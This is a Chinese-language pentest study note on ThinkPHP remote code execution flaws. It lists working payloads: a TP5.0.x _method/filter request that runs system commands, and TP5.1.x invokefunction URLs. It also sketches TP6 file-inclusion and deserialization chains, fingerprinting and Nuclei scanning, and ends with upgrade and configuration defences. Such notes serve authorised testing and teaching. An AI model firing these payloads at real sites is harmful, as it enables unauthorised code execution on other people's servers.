---
title: ThinkPHP RCE 漏洞链
date: 2025-09-20 08:00:00
tags:
  - Web安全
  - 框架安全
  - 渗透测试
description: ThinkPHP RCE 漏洞链——渗透测试实战笔记，含完整攻击链路与防御方案。
categories: 渗透测试
---

## ThinkPHP 5.x 核心 RCE

### TP5.0.x method 参数 RCE

最经典的 ThinkPHP RCE，影响 TP 5.0.x：

```
POST /index.php?s=captcha HTTP/1.1

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami
```

原理：`_method=__construct` 覆盖构造函数 → `filter[]=system` 指定过滤函数 → `method=get` + `server[REQUEST_METHOD]=whoami` 传入参数 → `system('whoami')` 执行。

### TP5.1-5.2 路由 RCE

```bash
# TP 5.1.x
http://target.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

# 通过 invokeFunction 调用任意函数
http://target.com/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```

---

## ThinkPHP 6.x RCE

### Session 文件包含

TP6 关闭了直接 RCE，但可以通过后期利用：

```bash
# 1. 向 Session 写 PHP 代码（需要找到一个可控写入点）
# 2. 利用文件包含读取 Session 文件
# /runtime/session/sess_<PHPSESSID>

# 或者利用 Log 文件包含
# /runtime/log/202401/01.log
```

### 反序列化链

```php
// TP6.x 中的 POP 链入口
// think\Model → __destruct() → save() → ...
// think\process\pipes\Windows → __destruct() → removeFiles()
```

---

## 批量检测

```bash
# ThinkPHP 指纹识别
# 1. 页面错误信息："thinkphp"
# 2. Header: X-Powered-By: ThinkPHP
# 3. favicon.ico hash 匹配

# TP 版本探测
http://target.com/index.php?show_error=1

# Nuclei 模板
nuclei -t nuclei-templates/technologies/thinkphp-detect.yaml -l targets.txt
```

---

## 防御

1. 升级到安全版本（TP 5.0.24+, 5.1.41+, 6.0.7+）
2. 关闭调试模式（`app_debug=false`）
3. 设置 `app_trace=false`
4. 限制路由解析的控制器和方法

---

> 本文仅用于授权安全测试与学习，请勿用于非法用途。
